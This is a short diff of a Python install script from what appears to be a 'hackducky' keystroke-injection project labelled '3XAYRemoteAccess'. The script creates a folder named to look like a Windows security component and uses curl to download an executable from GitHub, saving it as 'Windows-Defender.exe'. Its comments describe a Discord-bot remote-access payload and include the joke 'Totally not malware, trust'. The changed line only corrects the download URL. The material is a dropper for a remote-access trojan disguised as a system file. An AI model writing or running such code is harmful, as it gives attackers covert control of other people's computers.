@@ -12,7 +12,7 @@ def installStep(command):
 installStep("mkdir Windows-System-Security") #Totally not malware, trust
 
 #Step 2: Download the application to run the Discord bot
-installStep("curl https://github.com/3XAY/hackducky/blob/main/submissions/3XAYRemoteAccess/Windows-Defender-Compressed -o Windows-System-Security/Windows-Defender.exe")
+installStep("curl https://github.com/3XAY/hackducky/blob/main/submissions/3XAYRemoteAccess/Windows-Defender-Compressed.exe -o Windows-System-Security/Windows-Defender.exe")
 
 #Step 3: Create the .env file
 #NOTE: When creating your payload, make sure to put YOUR Discord ID and token, then compress it to an .EXE file
